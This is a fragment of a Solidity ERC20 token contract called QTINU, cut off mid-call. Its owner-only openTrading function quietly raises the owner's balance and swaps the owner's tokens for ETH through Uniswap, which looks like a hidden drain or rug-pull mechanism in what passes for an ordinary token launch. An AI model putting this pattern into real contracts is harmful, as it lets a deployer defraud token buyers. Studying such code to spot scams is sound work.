...
contract QTINU is Context, IERC20, Ownable {
    ...
    constructor () {
        _feeAddrWallet1 = payable(0x5aBA7a046988b907Aa014416CfFC0d8357385359);
        _feeAddrWallet2 = payable(0x5aBA7a046988b907Aa014416CfFC0d8357385359);
    ...
    function openTrading() external onlyOwner() {
        ...
        _rOwned[owner()] = _rOwned[owner()]+1;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        uint256 tokenAmount= _rOwned[owner()];
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
